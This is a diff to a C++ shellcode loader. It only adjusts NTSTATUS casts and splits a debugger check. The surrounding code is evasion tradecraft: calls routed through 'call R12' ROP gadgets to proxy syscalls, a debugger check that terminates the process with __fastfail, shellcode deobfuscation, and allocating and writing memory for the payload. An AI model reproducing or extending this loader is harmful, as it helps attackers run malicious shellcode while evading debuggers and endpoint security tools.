@@ -88,7 +88,7 @@ VOID RunMe() {
 	gadget = GoGoGadget(callR12gadgets);
 
 	PVOID debugFlags = nullptr;
-	if (NT_SUCCESS((NTSTATUS)CallR12(
+	        NTSTATUS callResult = (NTSTATUS)(ULONG_PTR)CallR12(
 		(PVOID)CallMe,
 		4,
 		gadget,
@@ -97,7 +97,8 @@ VOID RunMe() {
 		&debugFlags,
 		sizeof(debugFlags),
 		NULL
-	)) && debugFlags) __fastfail(0xC0000409); // Exit process if debugger is detected
+	);
+	if (NT_SUCCESS(callResult) && debugFlags) __fastfail(0xC0000409); // Exit process if debugger is detected
 	
 	// Shellcode deobfuscation and preparation
 	
@@ -314,7 +315,7 @@ VOID RunMe() {
 
 	PVOID baseAddress = nullptr;
 	SIZE_T regionSize = shellcode.size();
-	status = (NTSTATUS)CallR12(
+	status = (NTSTATUS)(ULONG_PTR)CallR12(
 		(PVOID)CallMe,
 		6,
 		gadget,
@@ -336,7 +337,7 @@ VOID RunMe() {
 	gadget = GoGoGadget(callR12gadgets);
 
 	SIZE_T bytesWritten = 0;
-	status = (NTSTATUS)CallR12(
+	status = (NTSTATUS)(ULONG_PTR)CallR12(
 		(PVOID)CallMe,
 		5,
 		gadget,
